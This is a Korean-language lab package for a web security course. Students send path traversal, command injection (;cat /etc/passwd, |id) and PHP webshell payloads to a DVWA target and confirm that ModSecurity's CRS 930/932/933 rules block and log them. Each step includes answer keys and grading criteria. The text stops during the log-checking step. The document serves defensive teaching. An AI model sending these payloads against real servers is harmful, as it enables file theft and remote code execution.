lab_id: standalone-web-vuln-week07
title: "파일 업로드/경로순회/명령주입 — RCE 발판 vs 입력검증 방어"
version: standalone-web-vuln
course: web-vuln
week: 7
description: |
  RCE(원격 코드 실행)로 이어지는 세 입력 취약점을 WSTG 점검자 관점에서 다룬다 — 경로순회(파일 경로에 ../를 끼워
  의도된 폴더 밖 파일 읽기), 명령주입(셸 구분자 ;|&로 OS 명령 추가 실행), 파일 업로드/PHP 주입(webshell 콘텐츠
  반입). 셋의 공통 뿌리는 "사용자 입력을 그대로 믿은 것"이다. el34 의 dvwa(차단 모드) 대상에 세 페이로드를 보내고,
  ModSecurity 가 각 유형을 930(LFI/경로순회)·932(RCE/명령주입)·933(PHP) 의 전용 룰군으로 탐지함을 audit 로그로
  확인한 뒤, 근본 방어(경로 정규화·OS 호출 회피·확장자/MIME allowlist)를 정리한다. 공격 발생은 el34-attacker,
  탐지 확인은 el34-web. 모든 명령은 el34 호스트(ssh ccc@{{TARGET_IP}})에서 docker exec 로. 인가된 실습만.
difficulty: hard
duration_minutes: 170
prerequisites:
  - "W01–W06 통과 (정찰·인증·SQLi·XSS 점검 경험)"
  - "el34 호스트 SSH 접속 + docker exec 사용 가능"
  - "lecture §2(경로순회/930) §3(명령주입/932) §4(파일 업로드/933) §5(입력검증·allowlist 방어) 숙지"
objectives:
  - "경로순회(../../etc/passwd)·명령주입(;cat)·PHP주입(<?php)을 dvwa 대상에 직접 시도하고 응답을 해석한다"
  - "ModSec audit 로그에서 930(LFI)/932(RCE)/933(PHP) 전용 룰군 탐지를 룰 ID 로 입증한다"
  - "세 취약점의 영향(파일읽기 vs RCE)을 구분하고 근본 방어(정규화/OS호출회피/allowlist)를 제시한다"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 점검 — 대상 도달성 확인
      모든 점검의 첫 단계는 대상이 응답하는지 확인하는 것이다. 대상이 무응답이면 이후 어떤 페이로드도
      의미가 없다. 본 주차의 점검 대상은 el34 의 **`dvwa.el34.lab`** vhost 다 — ModSec **차단 모드**
      (`SecRuleEngine On`)라서, 뒤 미션에서 보낼 공격 페이로드가 실제로 403 으로 막히는 것을 관찰할 수 있다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) 내부 발판(attacker)에서 dvwa(차단 모드) vhost 도달 확인 — Host 헤더로 vhost 지정, 응답코드만 dvwa= 형식으로
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
      ```
      - `el34-attacker` = el34 내부 발판 공격자 컨테이너. 여기서 fw 게이트웨이(`10.20.30.1`)로 요청을 보낸다.
      - `-H 'Host: dvwa.el34.lab'` = web 의 Apache 가 vhost 를 고르는 기준. 이 헤더가 dvwa 로 라우팅한다.
      - `-o /dev/null -w 'dvwa=%{http_code}'` = 응답 본문은 버리고 **HTTP 상태 코드만** 출력한다.
      ## ✅ 합격 기준
      `dvwa` 출력 시 통과. **근거:** `dvwa=` 와 함께 HTTP 코드가 나오면 대상이 응답하는 것이고, 무응답이면
      호스트 도달성·vhost 헤더·컨테이너 상태를 먼저 점검한다.
    hint: '도달성'
    category: survey
    points: 10
    answer: |
      # 1) 내부 발판(attacker)에서 dvwa(차단 모드) vhost 도달 확인 — Host 헤더로 vhost 지정, 응답코드만 dvwa= 형식으로
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
    answer_detail: "본 주차 RCE 취약점 점검 대상 = dvwa.el34.lab(ModSec 차단 모드). 대상이 HTTP 코드로 응답하면(dvwa=...) 도달성 확인 = 점검 착수 가능. WSTG 점검의 첫 단계(대상 도달성 검증)."
    verify:
      type: output_contains
      expect: 'dvwa'
      field: stdout
      semantic:
        intent: "대상 점검"
        success_criteria: ["도달"]
        acceptable_methods: ["**[OSS] curl (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 경로순회 — ../로 폴더 밖 파일 읽기 시도
      **경로순회**는 파일 경로 입력에 `../`(상위 폴더로 한 칸 올라가기)를 끼워, 개발자가 의도한 폴더 **밖의**
      파일까지 읽는 공격이다. `../` 를 충분히 반복하면 파일 시스템 최상위(`/`)까지 거슬러 올라가 `/etc/passwd`
      (리눅스 사용자 계정 목록 파일 — 경로순회 성공 확인용 표준 표적)에 도달한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) 경로순회 평문(?q=../../etc/passwd)을 dvwa에 전송 → pt= 응답코드(폴더 탈출 시도)
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'pt=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=../../etc/passwd'"
      # 2) 같은 페이로드를 URL 인코딩(%2e%2e%2f)해 전송 → enc= 응답코드(ModSec이 인코딩 우회도 정규화로 막는지 확인)
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'enc=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=%2e%2e%2f%2e%2e%2fetc%2fpasswd'"
      # 3) 해석 — ../ 경로 탈출이 930(LFI)에 403 차단, 인코딩도 정규화로 동일 차단
      echo "→ ../ 경로 탈출 → 930(LFI) 403. 인코딩도 정규화로 차단"
      ```
      - `?q=../../etc/passwd` = 파라미터에 `../` 경로 조각을 넣어 폴더 탈출을 시도하는 페이로드.
      - 정답 스크립트는 평문 `../` 와 **URL 인코딩** `%2e%2e%2f`(점·점·슬래시) 두 형태를 모두 보낸다 —
        ModSec 이 인코딩 우회를 함께 막는지(정규화) 확인하기 위해서다.
      ## ✅ 합격 기준
      `403` 출력 시 통과. **근거:** 두 요청 모두 403(ModSec 930 LFI 룰군 차단)이면 인코딩 우회까지 정규화로
      막힌 것 — 단, 이 403 은 "WAF 가 막아 준" 것이지 "앱이 안전한" 것은 아니다(근본 방어는 §5 경로 정규화).
    hint: '../../etc/passwd'
    category: manipulation
    points: 12
    answer: |
      # 1) 경로순회 평문(?q=../../etc/passwd)을 dvwa에 전송 → pt= 응답코드(폴더 탈출 시도)
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'pt=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=../../etc/passwd'"
      # 2) 같은 페이로드를 URL 인코딩(%2e%2e%2f)해 전송 → enc= 응답코드(ModSec이 인코딩 우회도 정규화로 막는지 확인)
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'enc=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=%2e%2e%2f%2e%2e%2fetc%2fpasswd'"
      # 3) 해석 — ../ 경로 탈출이 930(LFI)에 403 차단, 인코딩도 정규화로 동일 차단
      echo "→ ../ 경로 탈출 → 930(LFI) 403. 인코딩도 정규화로 차단"
    answer_detail: "경로순회 = ../ 로 의도된 폴더 밖 임의 파일(예: /etc/passwd) 읽기 시도. el34 dvwa(차단 모드)에서 ModSec 930(LFI) 룰군이 ../ 패턴을 탐지해 403. 평문(../)과 URL 인코딩(%2e%2e%2f) 모두 ModSec 의 정규화로 동일하게 403 → 인코딩 우회가 막힘을 입증."
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "경로순회"
        success_criteria: ["403(930)"]
        acceptable_methods: ["**[OSS] path traversal (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 명령주입 — 셸 구분자로 OS 명령 추가 실행 시도
      **명령주입**은 웹앱이 사용자 입력을 OS 셸 명령에 그대로 이어붙일 때, **셸 구분자**(`;` 순차실행,
      `|` 파이프, `&` `&&`, `$( )` `` ` ` ``)를 끼워 **별도의 OS 명령을 추가 실행**시키는 공격이다. 성공하면
      곧바로 **RCE(원격 코드 실행)** = 서버 완전 장악으로, 본 주차 취약점 중 최고 심각도다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) 명령주입 세미콜론 변형(?q=1;cat /etc/passwd)을 dvwa에 전송 → cmdi= 응답코드(; 로 OS 명령 추가)
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'cmdi=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=1;cat%20/etc/passwd'"
      # 2) 파이프 변형(?q=1|id)도 전송 → pipe= 응답코드
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'pipe=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=1|id'"
      # 3) 해석 — ;/| 로 OS 명령 연결 → 932(RCE) 탐지, 성공 시 완전 장악
      echo "→ ;/| 로 OS 명령 연결 → 932(RCE) 탐지. 성공 시 완전 장악"
      ```
      - `?q=1;cat /etc/passwd` = `;` 로 원래 입력(`1`) 뒤에 `cat /etc/passwd` 명령을 덧붙인 페이로드.
        (`%20` 은 URL 에서 공백을 뜻한다.) 정답 스크립트는 `|`(파이프) 변형도 함께 보낸다.
      ## ✅ 합격 기준
      `cmdi=` 출력 시 통과. **근거:** 명령주입 시도가 전송·기록되면(cmdi=) 이 입력점에 명령주입을 시도한
      흔적이 남은 것 — 응답 코드만으로는 성패 단정이 어렵고(블라인드 포함), 탐지 입증은 다음 미션(932)에서 한다.
    hint: ';cat /etc/passwd'
    category: manipulation
    points: 12
    answer: |
      # 1) 명령주입 세미콜론 변형(?q=1;cat /etc/passwd)을 dvwa에 전송 → cmdi= 응답코드(; 로 OS 명령 추가)
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'cmdi=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=1;cat%20/etc/passwd'"
      # 2) 파이프 변형(?q=1|id)도 전송 → pipe= 응답코드
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'pipe=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=1|id'"
      # 3) 해석 — ;/| 로 OS 명령 연결 → 932(RCE) 탐지, 성공 시 완전 장악
      echo "→ ;/| 로 OS 명령 연결 → 932(RCE) 탐지. 성공 시 완전 장악"
    answer_detail: "명령주입 = ;&|$() 등 셸 구분자로 OS 명령을 추가 실행 → 성공 시 RCE(완전 장악, 최고 심각도). el34 ModSec 932(RCE) 룰군이 탐지한다. 응답 코드만으로 성패를 단정하기 어려워(블라인드 명령주입 포함) 본 단계는 시도 전송(cmdi=)을 합격 기준으로 두고, 932 탐지는 다음 미션에서 입증한다."
    verify:
      type: output_contains
      expect: 'cmdi='
      field: stdout
      semantic:
        intent: "명령주입"
        success_criteria: [";명령 시도"]
        acceptable_methods: ["**[OSS] ;cmd 주입 (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 PHP 주입 — webshell 콘텐츠 반입 시도
      **파일 업로드 취약점**의 핵심 무기는 **webshell**(브라우저로 OS 명령을 실행하게 해주는 악성 스크립트)이다.
      그 전형이 `<?php system($_GET['c']); ?>` 같은 PHP 한 줄이다. 본 미션은 실제 업로드 폼 대신, **webshell 의
      시그니처인 `<?php ... ?>` 코드 자체**가 ModSec 에 어떻게 잡히는지를 점검한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) webshell 시그니처 <?php system('id'); ?> 를 URL 인코딩(%3C%3Fphp ... %3F%3E)해 dvwa에 전송 → php= 응답코드
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'php=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=%3C%3Fphp%20system(%27id%27)%3B%20%3F%3E'"
      # 2) 해석 — <?php ... ?> 위험 콘텐츠가 933(PHP)에 403 차단
      echo "→ <?php system('id')?> = webshell 콘텐츠 → 933(PHP) 403"
      ```
      - `%3C%3Fphp ... %3F%3E` = `<?php system('id'); ?>` 를 URL 인코딩한 것(`%3C`=`<`, `%3F`=`?`, `%3E`=`>`).
        즉 "서버에서 `id` 명령을 실행하라"는 webshell 콘텐츠를 요청에 실어 보낸다.
      ## ✅ 합격 기준
      `403` 출력 시 통과. **근거:** 403(ModSec 933 PHP 룰군 차단)이면 위험 콘텐츠가 WAF 에 걸린 것 — 단,
      실제 파일을 디스크에 올려 실행한 것은 아니다(실제 업로드 우회·셸 핸들링은 고급 트랙 영역).
    hint: '<?php system'
    category: manipulation
    points: 12
    answer: |
      # 1) webshell 시그니처 <?php system('id'); ?> 를 URL 인코딩(%3C%3Fphp ... %3F%3E)해 dvwa에 전송 → php= 응답코드
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'php=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?q=%3C%3Fphp%20system(%27id%27)%3B%20%3F%3E'"
      # 2) 해석 — <?php ... ?> 위험 콘텐츠가 933(PHP)에 403 차단
      echo "→ <?php system('id')?> = webshell 콘텐츠 → 933(PHP) 403"
    answer_detail: "PHP 주입 = webshell 의 핵심 시그니처(<?php ... ?>) 콘텐츠. el34 dvwa 에서 ModSec 933(PHP) 룰군이 PHP 태그·위험함수를 탐지해 403. 실제 업로드 우회는 대체 확장자(.phtml/.php5)·MIME 위조·polyglot 으로 시도하며(고급), 본 단계는 위험 콘텐츠 차단 여부만 점검."
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "PHP 주입"
        success_criteria: ["403(933)"]
        acceptable_methods: ["**[OSS] <?php 주입 (권장)**"]
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 탐지 — ModSec audit 로그에서 930/932/933 룰 ID 확인
      공격을 보냈으면 **방어 스택이 그것을 어떻게 기록했는지** 확인하는 것이 점검의 핵심이다 — "보냈다"가
      아니라 "탐지됐다"를 증거로 보인다. 앞 미션 2~4 의 공격(경로순회·명령주입·PHP주입)이 web 컨테이너의
      ModSec audit 로그에 각각 **전용 룰군**으로 기록된다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      # 1) web의 ModSec audit 로그 최근 250줄에서 6자리 CRS 룰ID(9xxxxx)만 뽑아 중복 제거 후 93으로 시작하는 룰만 남김
      docker exec el34-web sh -c 'sudo tail -250 /var/log/apache2/modsec_audit.log | grep -oE "9[0-9]{5}" | sort -u | grep -E "^93"'
      # 2) 해석 — 930(LFI/경로순회), 932(RCE/명령주입), 933(PHP) 전용 룰군으로 유형 식별
      echo "→ 930(LFI/경로순회), 932(RCE/명령주입), 933(PHP)"
      ```
      - `/var/log/apache2/modsec_audit.log` = ModSecurity 가 매치된 CRS 룰을 기록하는 audit 로그(web 컨테이너).
